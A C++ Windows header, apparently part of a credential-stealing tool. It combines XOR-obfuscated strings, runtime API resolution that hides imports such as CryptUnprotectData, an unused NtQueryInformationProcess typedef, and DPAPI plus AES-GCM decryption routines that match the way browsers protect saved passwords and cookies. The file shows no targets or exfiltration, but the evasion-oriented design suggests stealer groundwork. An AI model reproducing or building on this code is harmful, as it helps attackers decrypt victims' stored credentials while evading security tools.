#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <dpapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <intrin.h>

template<size_t N, uint8_t K>
struct XorStr {
    char buf[N]{};
    constexpr XorStr(const char(&s)[N]) {
        for (size_t i = 0; i < N; ++i)
            buf[i] = s[i] ^ (uint8_t)(K + (i * 7) % 17);
    }
};
template<size_t N, uint8_t K>
inline std::string xdec(const XorStr<N,K>& x) {
    std::string o(N-1,' ');
    for (size_t i = 0; i < N-1; ++i)
        o[i] = x.buf[i] ^ (uint8_t)(K + (i * 7) % 17);
    return o;
}
#define XS(s) xdec(XorStr<sizeof(s),0x4Fu>(s))

typedef NTSTATUS(NTAPI* pNtQIP)(HANDLE,UINT,PVOID,ULONG,PULONG);
typedef BOOL(WINAPI* pCUDP)(DATA_BLOB*,LPCWSTR,DATA_BLOB*,PVOID,CRYPTPROTECT_PROMPTSTRUCT*,DWORD,DATA_BLOB*);

inline FARPROC ResolveApi(const char* mod, const char* fn) {
    HMODULE h = GetModuleHandleA(mod);
    if (!h) h = LoadLibraryA(mod);
    return h ? GetProcAddress(h, fn) : nullptr;
}


#include <bcrypt.h>
#pragma comment(lib,"bcrypt.lib")

inline std::vector<uint8_t> AesGcmDecrypt(
    const std::vector<uint8_t>& key,
    const std::vector<uint8_t>& iv,
    const std::vector<uint8_t>& tag,
    const std::vector<uint8_t>& data)
{
    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    std::vector<uint8_t> plain(data.size());
    ULONG plainLen = 0;

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0)) return {};
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (BCryptGenerateSymmetricKey(alg, &hKey, nullptr, 0,
        (PBYTE)key.data(), (ULONG)key.size(), 0)) { BCryptCloseAlgorithmProvider(alg,0); return {}; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    BCRYPT_INIT_AUTH_MODE_INFO(info);
    info.pbNonce = (PBYTE)iv.data(); info.cbNonce = (ULONG)iv.size();
    info.pbTag   = (PBYTE)tag.data(); info.cbTag   = (ULONG)tag.size();

    NTSTATUS st = BCryptDecrypt(hKey, (PBYTE)data.data(), (ULONG)data.size(),
        &info, nullptr, 0, plain.data(), (ULONG)plain.size(), &plainLen, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(alg, 0);
    if (st != 0) return {};
    plain.resize(plainLen);
    return plain;
}

inline std::vector<uint8_t> DpapiDecrypt(const std::vector<uint8_t>& enc) {
    auto f = (pCUDP)ResolveApi(XS("crypt32.dll").c_str(), XS("CryptUnprotectData").c_str());
    if (!f) return {};
    DATA_BLOB in{ (DWORD)enc.size(), (BYTE*)enc.data() }, out{};
    if (!f(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) return {};
    std::vector<uint8_t> res(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return res;
}
